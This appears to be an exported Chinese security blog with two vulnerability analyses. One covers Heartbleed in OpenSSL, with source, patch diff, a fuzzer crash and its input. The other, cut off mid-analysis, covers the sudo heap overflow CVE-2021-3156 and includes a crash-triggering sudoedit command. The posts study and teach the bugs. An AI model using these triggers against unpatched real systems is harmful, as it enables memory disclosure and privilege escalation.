第一次握手过程中通过 Client Hello 消息和 Server Hello 消息的 Heartbeat Hello 扩展告知对方是否支持心跳机制。Heartbeat Hello 扩展的格式如下。当支持心跳机制时设置 HeartbeatMode 为 peer_allowed_to_send，可接收心跳请求消息并能返回响应包；当不支持心跳机制时设置 HeartbeatMode 为 peer_not_allowed_to_send，若对端发送心跳请求消息，将会丢弃该消息并返回 unexpected_message 警告消息。\n1 2 3 4 5 6 7 8 enum { peer_allowed_to_send(1), peer_not_allowed_to_send(2), } HeartbeatMode; struct { HeartbeatMode mode; } HeartbeatExtension; 心跳包的结构如下图所示，前半部分为 SSL 记录头，Content Type 为消息类型（0x18 表示心跳包消息），TLS Version 为 SSL 版本信息，Record length 为记录长度；后半部分即为心跳消息。\n其中，SSL 记录长度（Record length）为心跳消息的总长度。心跳包消息由数据包类型（type）、载荷长度（payload length）、载荷内容（payload）和填充字节（padding）组成。\n1 2 3 4 5 6 struct { HeartbeatMessageType type; // 1 bytes，包括request和response两种类型 uint16 payload_length; // 2 bytes，载荷长度 opaque payload[HeartbeatMessage.payload_length]; // payload_length bytes，载荷内容 opaque padding[padding_length]; // 填充字节，至少为16 bytes } HeartbeatMessage; 下图为心跳请求包的数据包实例，其载荷长度为 5 bytes：\nOpenSSL https://www.openssl.org/\n查阅文档：\n1 man 7 crypto The OpenSSL crypto library (libcrypto) implements a wide range of cryptographic algorithms used in various Internet standards. The services provided by this library are used by the OpenSSL implementations of TLS and CMS, and they have also been used to implement many other third party products and protocols.\nThe functionality includes symmetric encryption, public key cryptography, key agreement, certificate handling, cryptographic hash functions, cryptographic pseudo-random number generators, message authentication codes (MACs), key derivation functions (KDFs), and various utilities.\n漏洞分析 源码获取 获取含漏洞的源码：\n1 2 3 git clone git://git.openssl.org/openssl.git cd openssl git checkout OpenSSL_1_0_1f OpenSSL 是 SSL 协议实现的开源软件包，存在漏洞的两个文件为 ssl/d1_both.c 和 ssl/t1_lib.c，这两个文件中的 dtls1_process_heartbeat 函数和 tls1_process_heartbeat 函数分别为 DTLS（数据报安全传输协议）和 TLS（传输层安全协议）处理心跳请求包的函数。两函数的实现完全相同，此处选取 dtls1_process_heartbeat 进行分析。\n成因预习 代码分析 预习完后首先来看看出现漏洞的函数：\n1 2 3 4 5 6 7 #ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], *pl; // ... } 我们发现，为了完整弄清楚该函数中的逻辑，我们还需了解参数SSL的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /* crypto/ossl_tpy.h */ typedef struct ssl_st SSL; /* ssl/ssl.h */ struct ssl_st { ... struct ssl2_state_st *s2; /* SSLv2 variables */ struct ssl3_state_st *s3; /* SSLv3 variables */ struct dtls1_state_st *d1; /* DTLSv1 variables */ ... }; /* ssl/ssl3.h */ typedef struct ssl3_state_st { ... SSL3_RECORD rrec;\t/* each decoded record goes in here */ ... }; /* ssl/ssl3.h */ typedef struct ssl3_record_st { /*r */\tint type; /* type of record */ /*rw*/\tunsigned int length; /* How many bytes available */ /*r */\tunsigned int off; /* read/write offset into \u0026#39;buf\u0026#39; */ /*rw*/\tunsigned char *data; /* pointer to the record data */ /*rw*/\tunsigned char *input; /* where the decode bytes are */ /*r */\tunsigned char *comp; /* only used with decompression - malloc()ed */ /*r */ unsigned long epoch; /* epoch number, needed by DTLS1 */ /*r */ unsigned char seq_num[8]; /* sequence number, needed by DTLS1 */ } SSL3_RECORD; 由此可知，函数第一行的指针p，指向 SSL3 记录数据，即心跳消息。函数体即处理该心跳消息。\n接下来还原函数逻辑与漏洞原因：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], *pl; // p指向SSL3请求包中的心跳消息 unsigned short hbtype; // 心跳包类型 unsigned int payload; // 心跳请求包payload长度 unsigned int padding = 16; /* Use minimum padding */ // 心跳请求包padding长度 /* Read type and payload length first */ hbtype = *p++; // 心跳包类型 = 1，为心跳请求包 n2s(p, payload); // 使用n2s宏从请求包中取两个字节的载荷长度赋给变量payload，并将p指针后移2个字节，此后指针p指向心跳包载荷 pl = p; // pl指向心跳包载荷 if (s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(0, s-\u0026gt;version, TLS1_RT_HEARTBEAT, \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], s-\u0026gt;s3-\u0026gt;rrec.length, s, s-\u0026gt;msg_callback_arg); if (hbtype == TLS1_HB_REQUEST) // 若心跳包类型为 TLS1_HB_REQUEST，是一个请求包 { unsigned char *buffer, *bp; int r; /* Allocate memory for the response, size is 1 byte * message type, plus 2 bytes payload length, plus * payload, plus padding */ buffer = OPENSSL_malloc(1 + 2 + payload + padding); // 依据请求包中记录的payload与padding长度，为心跳响应包分配内存 bp = buffer; /* Enter response type, length and copy payload */ *bp++ = TLS1_HB_RESPONSE; // 填充 1 byte 的心跳包类型 = 0x02，为心跳响应包 s2n(payload, bp); // 填充 2 bytes 的载荷长度 memcpy(bp, pl, payload); /* 填充心跳响应包载荷（由用户提供） * 由于心跳包载荷长度（payload）完全由来自请求包，由用户控制 * 故此处若payload变量值大于实际payload大小 * 就会导致额外的数据被拷贝至响应包 * 进而造成信息泄露 */ bp += payload; // 指针后移payload字节 /* Random padding */ RAND_pseudo_bytes(bp, padding); // 填充随机字节 r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); // 将构造好的心跳响应包写入 SSL3_RECORD 中，并返回给客户端 if (r \u0026gt;= 0 \u0026amp;\u0026amp; s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(1, s-\u0026gt;version, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding, s, s-\u0026gt;msg_callback_arg); OPENSSL_free(buffer); if (r \u0026lt; 0) return r; } else if (hbtype == TLS1_HB_RESPONSE) { unsigned int seq; /* We only send sequence numbers (2 bytes unsigned int), * and 16 random bytes, so we just try to read the * sequence number */ n2s(pl, seq); if (payload == 18 \u0026amp;\u0026amp; seq == s-\u0026gt;tlsext_hb_seq) { dtls1_stop_timer(s); s-\u0026gt;tlsext_hb_seq++; s-\u0026gt;tlsext_hb_pending = 0; } } return 0; } 漏洞修复 git 查看漏洞修复前后版本差异：\n1 git diff OpenSSL_1_0_1f OpenSSL_1_0_1g 定位到dtls1_process_heartbeat函数，得到：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 -Version: 1.0.1f +Version: 1.0.1g Source0: ftp://ftp.openssl.org/source/%{name}-%{version}.tar.gz License: OpenSSL Group: System Environment/Libraries diff --git a/ssl/d1_both.c b/ssl/d1_both.c index 7a5596a6b3..2e8cf681ed 100644 --- a/ssl/d1_both.c +++ b/ssl/d1_both.c @@ -1459,26 +1459,36 @@ dtls1_process_heartbeat(SSL *s) unsigned int payload; unsigned int padding = 16; /* Use minimum padding */ - /* Read type and payload length first */ - hbtype = *p++; - n2s(p, payload); - pl = p; - if (s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(0, s-\u0026gt;version, TLS1_RT_HEARTBEAT, \u0026amp;s-\u0026gt;s3-\u0026gt;rrec.data[0], s-\u0026gt;s3-\u0026gt;rrec.length, s, s-\u0026gt;msg_callback_arg); # 添加的检查1：当实际心跳载荷（payload）长度为0时，函数返回0 + /* Read type and payload length first */ + if (1 + 2 + 16 \u0026gt; s-\u0026gt;s3-\u0026gt;rrec.length) + return 0; /* silently discard */ + hbtype = *p++; + n2s(p, payload); # 添加的检查2：当计算得心跳消息长度大于SSL3数据包长度时（两者应该等同），即心跳包载荷长度（payload length）大于实际载荷（payload）的长度时，函数返回0 + if (1 + 2 + payload + 16 \u0026gt; s-\u0026gt;s3-\u0026gt;rrec.length) + return 0; /* silently discard per RFC 6520 sec. 4 */ + pl = p; + if (hbtype == TLS1_HB_REQUEST) { unsigned char *buffer, *bp; + unsigned int write_length = 1 /* heartbeat type */ + + 2 /* heartbeat length */ + + payload + padding; int r; + if (write_length \u0026gt; SSL3_RT_MAX_PLAIN_LENGTH) + return 0; + /* Allocate memory for the response, size is 1 byte * message type, plus 2 bytes payload length, plus * payload, plus padding */ - buffer = OPENSSL_malloc(1 + 2 + payload + padding); + buffer = OPENSSL_malloc(write_length); bp = buffer; /* Enter response type, length and copy payload */ @@ -1489,11 +1499,11 @@ dtls1_process_heartbeat(SSL *s) /* Random padding */ RAND_pseudo_bytes(bp, padding); - r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding); + r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, write_length); if (r \u0026gt;= 0 \u0026amp;\u0026amp; s-\u0026gt;msg_callback) s-\u0026gt;msg_callback(1, s-\u0026gt;version, TLS1_RT_HEARTBEAT, - buffer, 3 + payload + padding, + buffer, write_length, s, s-\u0026gt;msg_callback_arg); OPENSSL_free(buffer); Fuzzing 挖掘 CVE-2014-0160 使用Google的fuzzer-test-suite来实践，先构建包含漏洞的openssl：\n1 2 3 git clone https://github.com/google/fuzzer-test-suite.git mkdir CVE-2014-0160; cd CVE-2014-0160 ../fuzzer-test-suite/openssl-1.0.1f/build.sh This command will download the openssl sources at the affected revision and build the fuzzer for one specific API that has the bug, see openssl-1.0.1f/target.cc：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 // Copyright 2016 Google Inc. All Rights Reserved. // Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); #include \u0026lt;openssl/ssl.h\u0026gt; #include \u0026lt;openssl/err.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; SSL_CTX *Init() { SSL_library_init(); SSL_load_error_strings(); ERR_load_BIO_strings(); OpenSSL_add_all_algorithms(); SSL_CTX *sctx; assert (sctx = SSL_CTX_new(TLSv1_method())); /* These two file were created with this command: openssl req -x509 -newkey rsa:512 -keyout server.key \\ -out server.pem -days 9999 -nodes -subj /CN=a/ */ assert(SSL_CTX_use_certificate_file(sctx, \u0026#34;runtime/server.pem\u0026#34;, SSL_FILETYPE_PEM)); assert(SSL_CTX_use_PrivateKey_file(sctx, \u0026#34;runtime/server.key\u0026#34;, SSL_FILETYPE_PEM)); return sctx; } extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { static SSL_CTX *sctx = Init(); SSL *server = SSL_new(sctx); BIO *sinbio = BIO_new(BIO_s_mem()); BIO *soutbio = BIO_new(BIO_s_mem()); SSL_set_bio(server, sinbio, soutbio); SSL_set_accept_state(server); BIO_write(sinbio, Data, Size); SSL_do_handshake(server); SSL_free(server); return 0; } 构建完成后运行刚刚编译好的fuzzer：\n1 ./openssl-1.0.1f-fsanitize_fuzzer 就能跑出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 ================================================================= ==2190163==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x00000051d75a bp 0x7fff7d14a450 sp 0x7fff7d149c18 READ of size 33536 at 0x629000009748 thread T0 #0 0x51d759 in __asan_memcpy (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x51d759) #1 0x55c283 in tls1_process_heartbeat /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/t1_lib.c:2586:3 #2 0x5c7321 in ssl3_read_bytes /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_pkt.c:1092:4 #3 0x5cb7f3 in ssl3_get_message /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:457:7 #4 0x597c86 in ssl3_get_client_hello /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_srvr.c:941:4 #5 0x593b21 in ssl3_accept /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_srvr.c:357:9 #6 0x55052d in LLVMFuzzerTestOneInput /root/lab/fuzzing_baby/CVE-2014-0160/../fuzzer-test-suite/openssl-1.0.1f/target.cc:34:3 #7 0x4587a1 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x4587a1) #8 0x457ee5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x457ee5) #9 0x45a187 in fuzzer::Fuzzer::MutateAndTestOne() (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45a187) #10 0x45ae85 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45ae85) #11 0x44983e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x44983e) #12 0x472682 in main (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x472682) #13 0x7f58322b0082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #14 0x41e5dd in _start (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x41e5dd) 0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748) allocated by thread T0 here: #0 0x51e30d in malloc (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x51e30d) #1 0x5fab2b in CRYPTO_malloc /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/crypto/mem.c:308:8 #2 0x5ccf07 in freelist_extract /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:708:12 #3 0x5ccf07 in ssl3_setup_read_buffer /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:770:10 #4 0x5cd51c in ssl3_setup_buffers /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_both.c:827:7 #5 0x59474f in ssl3_accept /root/lab/fuzzing_baby/CVE-2014-0160/BUILD/ssl/s3_srvr.c:292:9 #6 0x55052d in LLVMFuzzerTestOneInput /root/lab/fuzzing_baby/CVE-2014-0160/../fuzzer-test-suite/openssl-1.0.1f/target.cc:34:3 #7 0x4587a1 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x4587a1) #8 0x45a4da in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45a4da) #9 0x45ab69 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x45ab69) #10 0x44983e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x44983e) #11 0x472682 in main (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x472682) #12 0x7f58322b0082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: heap-buffer-overflow (/f/lab/fuzzing_baby/CVE-2014-0160/openssl-1.0.1f-fsanitize_fuzzer+0x51d759) in __asan_memcpy Shadow bytes around the buggy address: 0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =\u0026gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa 0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==2190163==ABORTING MS: 1 CopyPart-; base unit: 380cd810619fc15deda5a170f6bec4cfd229086b 0x18,0x3,0x29,0x0,0x1,0x1,0x0, \\x18\\x03)\\x00\\x01\\x01\\x00 artifact_prefix=\u0026#39;./\u0026#39;; Test unit written to ./crash-8f882413170d68fb148303a53b5208b0f2dc61cc Base64: GAMpAAEBAA== ","date":"2022-05-20T17:57:07+08:00","image":"https://s2.loli.net/2022/05/20/atE5hjX1gbFPnUN.jpg","permalink":"https://cerr.cc/post/cve-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/","title":"CVE-2014-0160 心脏滴血漏洞挖掘与分析"},{"content":" CVE-2021-3156是sudo中存在一个堆溢出漏洞。影响从1.8.2~1.8.31p2下的所有旧版本sudo，以及1.9.0~1.9.5p1的所有稳定版sudo。可以使得任何没有特权的用户均可使用默认的sudo配置获取root权限\n环境准备 使用apt获取软件源提供的sudo源码：\n1 sudo apt source sudo 却被告知：\n1 2 3 4 5 NOTICE: \u0026#39;sudo\u0026#39; packaging is maintained in the \u0026#39;Git\u0026#39; version control system at: https://salsa.debian.org/sudo-team/sudo.git Please use: git clone https://salsa.debian.org/sudo-team/sudo.git to retrieve the latest (possibly unreleased) updates to the package. 于是听话，从git仓库获取源码：\n1 git clone https://salsa.debian.org/sudo-team/sudo.git 接下来进行构建：\n1 2 3 4 # clone configure make git reset --hard 36955b3ef399efeea25824d32e6cfbaa444e9f07 # v1.9.5p1 CFLAGS+=-g ./configure --sysconfdir=`pwd`/examples --with-plugindir=`pwd`/plugins/sudoers/.libs make -j`nproc` 构建完成后在root用户下可以执行测试：\n1 LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudo 验证编译目标的确存在漏洞，前需事先创建名为 sudoedit 的 sudo 的软链接以绕过后续检查：\n1 2 3 cd src/.libs ln -s sudo sudoedit cd ../../ 执行验证：\n1 2 3 ➜ sudo git:(master) ✗ LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; malloc(): corrupted top size [1] 1357050 abort (core dumped) LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; 说明漏洞的确存在。\n漏洞成因 sudo.c 中的 main 函数，会调用 parse_args 函数来处理sudo的命令行参数：\n1 2 /* Parse command line arguments. */ sudo_mode = parse_args(argc, argv, \u0026amp;submit_optind, \u0026amp;nargc, \u0026amp;nargv, \u0026amp;settings, \u0026amp;env_add); parse_args 函数于 parse_args.c 中实现。\n当向 sudo 传入 -s 或 -i 参数时，sudo 执行如下行为：\n1 2 -s, --shell run shell as the target user; a command may also be specified -i, --login run login shell as the target user; a command may also be specified -s 或 -i 后可以接实际想要在shell中执行的命令。使用举例：\n1 2 sudo -s echo \\$UID 0 在sudo处理参数的逻辑中，-s 会设定 flags 中的 MODE_SHELL 位，-i 会设定 flags 中的 MODE_LOGIN_SHELL 位：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 switch (ch) { // ... case \u0026#39;i\u0026#39;: sudo_settings[ARG_LOGIN_SHELL].value = \u0026#34;true\u0026#34;; SET(flags, MODE_LOGIN_SHELL); break; // ... case \u0026#39;s\u0026#39;: sudo_settings[ARG_USER_SHELL].value = \u0026#34;true\u0026#34;; SET(flags, MODE_SHELL); break; // ... } 且后续 MODE_LOGIN_SHELL 也会设置 MODE_SHELL：\n1 2 3 4 5 if (ISSET(flags, MODE_LOGIN_SHELL)) { // ... SET(flags, MODE_SHELL); } 加上 mode 变量中已有的 MODE_RUN 标志位，会在其后的执行流中进入如下 if 块中，用于处理sudo在特定参数下需要处理的命令行参数中的转义符\\：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /* * Command line argument parsing. * Sets nargc and nargv which corresponds to the argc/argv we\u0026#39;ll use * for the command to be run (if we are running one). */ int parse_args(int argc, char **argv, int *old_optind, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp) { // …… // （前面是参数解析与MODE判断的一堆代码 /* * For shell mode we need to rewrite argv （只关注这块if里的逻辑 */ if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { char **av, *cmnd = NULL; int ac = 1; if (argc != 0) { /* shell -c \u0026#34;command\u0026#34; */ char *src, *dst; size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(\u0026#34;%s: %s\u0026#34;), __func__, U_(\u0026#34;unable to allocate memory\u0026#34;)); if (!gc_add(GC_PTR, cmnd)) exit(EXIT_FAILURE); // 从原 argv 中拷贝字符串，构建 command for (av = argv; *av != NULL; av++) { for (src = *av; *src != \u0026#39;\\0\u0026#39;; src++) { /* quote potential meta characters */ // 将数字、字母、_、-、$ 之外的所有字符前加上字符 \\，用于转义 if (!isalnum((unsigned char)*src) \u0026amp;\u0026amp; *src != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;-\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;$\u0026#39;) *dst++ = \u0026#39;\\\\\u0026#39;; // C源代码中用 \u0026#39;\\\\\u0026#39; 表示字符 \\ *dst++ = *src; } *dst++ = \u0026#39; \u0026#39;; } if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = \u0026#39;\\0\u0026#39;; ac += 2; /* -c cmnd */ } av = reallocarray(NULL, ac + 1, sizeof(char *)); if (av == NULL) sudo_fatalx(U_(\u0026#34;%s: %s\u0026#34;), __func__, U_(\u0026#34;unable to allocate memory\u0026#34;)); if (!gc_add(GC_PTR, av)) exit(EXIT_FAILURE); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) { av[1] = \u0026#34;-c\u0026#34;; av[2] = cmnd; } av[ac] = NULL; argv = av; argc = ac; } parse_args函数是故事的开始。虽然做好了出发漏洞的准备，但到目前为止尚且无事发生。我们需要接着向下探索。故开启调试以动态跟踪，下断点于上述 if 块的起始位置：\n1 2 3 4 5 gdb src/.libs/sudoedit pwndbg\u0026gt; set args -s / pwndbg\u0026gt; set environment LD_LIBRARY_PATH=./lib/util/.libs/ pwndbg\u0026gt; b parse_args.c:604 pwndbg\u0026gt; r 一路向下跟踪，尽快来到本次事件的漏洞中心—— set_cmnd 函数看看。backtrace如下：\n1 2 3 4 5 6 7 8 pwndbg\u0026gt; bt #0 set_cmnd () at ./sudoers.c:922 #1 sudoers_policy_main (argc=argc@entry=3, argv=argv@entry=0x555555584590, pwflag=pwflag@entry=0, env_add=env_add@entry=0x0, verbose=verbose@entry=false, closure=closure@entry=0x7fffffffe1d0) at ./sudoers.c:401 #2 0x00007ffff79de5f2 in sudoers_policy_check (argc=3, argv=0x555555584590, env_add=0x0, command_infop=0x7fffffffe290, argv_out=0x7fffffffe298, user_env_out=0x7fffffffe2a0, errstr=0x7fffffffe2b8) at ./policy.c:1028 #3 0x000055555555aefa in policy_check (user_env_out=0x7fffffffe2a0, argv_out=0x7fffffffe298, command_info=0x7fffffffe290, env_add=0x0, argv=0x555555584590, argc=3) at ./sudo.c:1171 #4 main (argc=argc@entry=3, argv=argv@entry=0x7fffffffe538, envp=\u0026lt;optimized out\u0026gt;) at ./sudo.c:269 #5 0x00007ffff7da4083 in __libc_start_main (main=0x55555555aa00 \u0026lt;main\u0026gt;, argc=3, argv=0x7fffffffe538, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffe528) at ../csu/libc-start.c:308 #6 0x000055555555d06e in _start () set_cmnd 就是漏洞触发点所在的函数了，其中有如下逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 /* * Fill in user_cmnd, user_args, user_base and user_stat variables * and apply any command-specific defaults entries. */ static int set_cmnd(void) { //... // 取消转义符需满足的条件1 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { //... /* set user_args */ if (NewArgc \u0026gt; 1) { char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) { sudo_warnx(U_(\u0026#34;%s: %s\u0026#34;), __func__, U_(\u0026#34;unable to allocate memory\u0026#34;)); debug_return_int(NOT_FOUND_ERROR); } // 取消转义符需满足的条件2 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ // 遍历传入的参数 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { while (*from) { // 当当前字符为 \\，且其后紧跟的字符不为空格时，则跳过对当前字符 \\ 的复制 // 即：将传入的命令参数字符串中的所有转义符舍去 if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; } *to++ = \u0026#39; \u0026#39;; } *--to = \u0026#39;\\0\u0026#39;; } else { //... } } } //... } 回到文章开头的例子，我们可以分析其中的错误原因了：\n1 2 3 ➜ sudo git:(master) ✗ LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; malloc(): corrupted top size [1] 1357050 abort (core dumped) LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; 对于这段代码：\n1 2 3 4 5 6 7 while (*from) { // 当当前字符为 \\，且其后紧跟的字符不为空格时，则跳过对当前字符 \\ 的复制 // 即：将传入的命令参数字符串中的所有转义符舍去 if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; } 若传入的命令参数字符串以 \\ 结尾，则会使得处理该 \\ 字符时出现：\nfrom[0] == '\\\\'（单走一个 \\ ) from[1] == '\\x00' （C语言字符串结尾标记字符） 导致此次循环中if条件成立，执行 from++，再加上下一行的 *to++ = *from++，使得from指针直接越过了原字符串的范围。由此导致*from == \\x00时的一字节被略过，while继续执行，拷贝了额外的非法数据。\n由此得到了程序中的错误，但这个错误是如何成为漏洞的，还需向上回溯被写入的缓冲区：\n向to指针指向的位置写入来自from指针的数据： 1 *to++ = *from++; to指针用于向user_args缓冲区写入数据： 1 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { user_args缓冲区是malloc了size大小得到的堆缓冲区： 1 if (size == 0 || (user_args = malloc(size)) == NULL) { 